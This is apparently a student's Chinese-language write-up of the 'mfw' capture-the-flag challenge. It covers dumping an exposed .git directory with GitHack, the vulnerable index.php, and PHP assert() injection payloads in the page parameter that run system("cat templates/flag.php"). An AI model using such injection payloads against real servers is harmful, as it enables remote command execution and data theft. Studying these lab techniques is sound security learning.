# mfw

## 解题思路

- 首先进入页面，看到一个像模像样的网页，直接找/.git/

- 发现居然直接能打开，然而里面没有什么能用的东西。

- 但是既然可以打开/.git，那说明可以用githack抓下来看一下项目里面有什么。

- 运行githack，只能抓到 `/.git/` 这个目录，但是查看其他人的writeup发现他们可以直接把跟 `/.git` 同级的其它文件全部抓下来，看来我的githack出了问题。

- 经过一番仔细琢磨，重新安了一台Linux虚拟机，给虚拟机配了python和git，重新下载了一遍 GitHack ，发现成功了！

    果然是因为环境不对啊！

- 运行 GitHack 之后，成功拿到了目标代码，分别是一个叫 `template` 的文件夹 和 一个叫 `index.php` 的php脚本。

    `template` 里有个叫 `flag.php` 的文件，但里面是空的。

    `index.php` 里的非页面布局代码如下：

    ```php
    <?php

    if (isset($_GET['page'])) {
        $page = $_GET['page'];
    } else {
        $page = "home";
    }

    $file = "templates/" . $page . ".php";

    // I heard '..' is dangerous!
    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

    // TODO: Make this look nice
    assert("file_exists('$file')") or die("That file doesn't exist!");

    ?>

    ...

    <!--<li 
    <?php 
    if ($page == "flag") { ?>class="active"<?php } 
    ?>><a href="?page=flag">My secrets</a></li> -->

    ```

    后面就是一些页面布局加载脚本了。

    看得出来，它的逻辑是：获取用户的 `get` 请求值，并填入 `file` 里，跳转执行对应页面的php脚本,并且 “flag” 就存在名为 `templates/flag.php` 的文件里。

- 首先，尝试直接构造url： `.../?page=flag` ，发现不行，

    这里就用到了一个新的命令执行漏洞： `assert()` ：检查一个语句是否为false。

    - `assert()` 语句会直接将 **字符串** 类型的输入当作php语句进行执行，这意味着如果传入程序代码，那么这些输入也会被忠实执行，这对于渗透工作有着巨大的作用。

    - 本题中的用法有两种，一种是直接把连接运算符 `.` 后面的部分注释掉，让服务器以为执行语句到中途就终止；另一种是把攻击者的代码作为参数以字符串的形式传给服务器。

    - 针对第一种方法，我们可以构造如下payload：

        ```php
        page='').system("cat templates/flag.php");//'

        $file = "templates/" . '').system("cat templates/flag.php");//' . ".php";

        $file = 'templates/').system("cat templates/flag.php");//.php'

        assert("strpos('templates/').system("cat templates/flag.php");//.php', '..') === false") or die("Detected hacking attempt!");
        ```

        可以看到， `assert()` 先执行了 **判断字符串中有无目标** ，之后又执行了 `system("cat templates/flag.php")` ,在执行完返回结果后才进行断言，而这时已经晚了（尽管断言的判断也没能阻止语句运行）。

    - 第二种方法有一个问题我想不明白，看网上有人构造了如下payload：

        ```php

        page='.system("cat templates/flag.php").'

        $file = "templates/" . '.system("cat templates/flag.php").' . ".php";

        $file = 'templates/.system("cat templates/flag.php")..php'

        ```

        问题在于 `file` 变量中出现了 `..` 这一符号，为什么strpos没有把它拿出来呢？

        而且我试了一下，如果 `page=.` ，则会返回 `Detected hacking attempt!` ,而 `page='.'` 则不会，这到底是为什么呢？明天解决一下。

- 问题：为什们payload按第二种方法可以成功呢？